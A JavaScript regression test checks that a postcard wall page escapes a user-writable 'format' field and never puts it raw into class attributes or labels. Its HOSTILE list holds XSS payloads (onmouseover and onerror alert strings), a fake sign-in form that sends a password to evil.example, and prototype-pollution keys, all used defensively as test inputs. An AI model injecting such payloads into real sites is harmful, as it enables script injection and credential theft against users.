// Offline check for the postcard wall (js/postcards.js). postcards.format has
// no CHECK constraint and anonymous REST inserts can write any string into it,
// so the wall must never put a stored format into its class attribute or its
// label as-is. Regression for F02 (2026-10 sweep): the raw value landed in
// class="postcard postcard--${format}" and in the .postcard__format label.
// The page script runs against a stub DOM with utils-render.js loaded for real.
const { test } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const vm = require('node:vm');
const { startTags, textElement } = require('./lib/html-tags');

const read = rel => fs.readFileSync(path.join(__dirname, '..', rel), 'utf8');
const id = n => `22222222-2222-4222-8222-${String(n).padStart(12, '0')}`;
const card = (n, format) => ({
    id: id(n), content: `Card ${n} body.`, model: 'Claude', model_version: null, ai_name: `Voice ${n}`,
    ai_identity_id: null, feeling: null, format, created_at: '2026-10-01T12:00:00Z', facilitator_id: null, is_active: true
});

class Element {
    constructor() {
        this.innerHTML = ''; this.textContent = ''; this.disabled = false; this.style = {}; this.listeners = {};
        this.classList = { add() {}, remove() {}, contains: () => false };
    }
    addEventListener(type, fn) { this.listeners[type] = fn; }
    querySelector() { return null; }
    replaceChildren() { this.innerHTML = ''; }
    scrollIntoView() {}
}

async function renderWall(rows) {
    const elements = new Map();
    const el = key => { if (!elements.has(key)) elements.set(key, new Element()); return elements.get(key); };
    let copied = null;
    const sandbox = {
        console, Promise, Map, Date,
        setTimeout: () => 0,
        CONFIG: { api: { postcards: 'postcards', postcard_prompts: 'postcard_prompts', postcard_reactions: 'postcard_reactions' } },
        Auth: { isLoggedIn: () => false, getUser: () => null, getActiveIdentity: () => null },
        Discovery: { validId: () => false },
        Utils: {
            getUrlParam: () => null,
            get: async api => (api === 'postcards' ? rows : []),
            getCount: async () => rows.length,
            getPostcardReactions: async () => new Map(),
            renderReactionBar: () => '',
            getModelInfo: () => ({ class: 'claude' }),
            formatRelativeTime: () => 'today',
            showLoading() {}, showEmpty() {}, showError() {},
            copyToClipboard: async text => { copied = text; return true; }
        },
        document: {
            getElementById: el,
            querySelector: () => null,
            querySelectorAll: () => [],
            addEventListener() {},
            createElement: textElement
        }
    };
    sandbox.window = sandbox;
    sandbox.window.addEventListener = () => {};
    vm.createContext(sandbox);
    vm.runInContext(read('js/utils-render.js'), sandbox, { filename: 'js/utils-render.js' });
    vm.runInContext(read('js/postcards.js'), sandbox, { filename: 'js/postcards.js' });
    const wall = el('postcards-list');
    for (let n = 0; n < 50 && !wall.innerHTML.includes('postcard__content'); n++) await new Promise(r => setImmediate(r));
    assert.ok(wall.innerHTML.includes('postcard__content'), 'the wall rendered');
    const copyContext = async () => {
        await el('copy-context-btn').listeners.click();
        return copied;
    };
    return { html: wall.innerHTML, copyContext };
}

const KNOWN = ['open', 'haiku', 'six-words', 'first-last', 'acrostic'];
const LABELS = ['Haiku', 'Six Words', 'First/Last', 'Acrostic'];
const HOSTILE = [
    'x" onmouseover="alert(1)" style="position:fixed;inset:0;z-index:99999',
    '<form action="https://evil.example/"><input name="password"><button>Sign in</button></form>',
    '"><img src=x onerror=alert(1)>',
    '__proto__',
    'constructor',
    'free'
];

function cards(html) {
    return startTags(html).filter(t => t.name === 'div' && t.attrs.some(a => a.name === 'data-postcard-row-id'));
}

function labels(html) {
    return [...html.matchAll(/<div class="postcard__format">([\s\S]*?)<\/div>/g)].map(m => m[1].trim());
}

test('known formats keep their class and label', async () => {
    const { html } = await renderWall(KNOWN.map((f, n) => card(n, f)));
    assert.deepEqual(cards(html).map(t => t.attrs.find(a => a.name === 'class').value), KNOWN.map(f => `postcard postcard--${f}`));
    assert.deepEqual(labels(html), LABELS);
});

test('an unknown stored format renders as open: no raw class, no label, no markup', async () => {
    const { html } = await renderWall([...HOSTILE.map((f, n) => card(n, f)), card(9, null), card(10, '')]);
    const found = cards(html);
    assert.equal(found.length, HOSTILE.length + 2);
    for (const t of found) {
        assert.deepEqual(t.attrs.map(a => a.name), ['class', 'data-postcard-row-id'], 'only the attributes the wall writes');
        assert.equal(t.attrs.find(a => a.name === 'class').value, 'postcard postcard--open');
    }
    assert.deepEqual(labels(html), []);
    const tagNames = new Set(startTags(html).map(t => t.name));
    assert.deepEqual([...tagNames].sort(), ['div', 'span']);
    assert.equal(/onmouseover|onerror|evil\.example|function/.test(html), false, html);
});

test('copy context carries only known format labels', async () => {
    const { copyContext } = await renderWall([card(1, 'haiku'), ...HOSTILE.map((f, n) => card(n + 2, f))]);
    const text = await copyContext();
    const headings = text.split('\n').filter(l => l.startsWith('### '));
    assert.equal(headings.length, HOSTILE.length + 1);
    assert.equal(headings[0], '### Voice 1, Claude [Haiku]');
    for (const h of headings.slice(1)) assert.match(h, /^### Voice \d+, Claude$/);
});
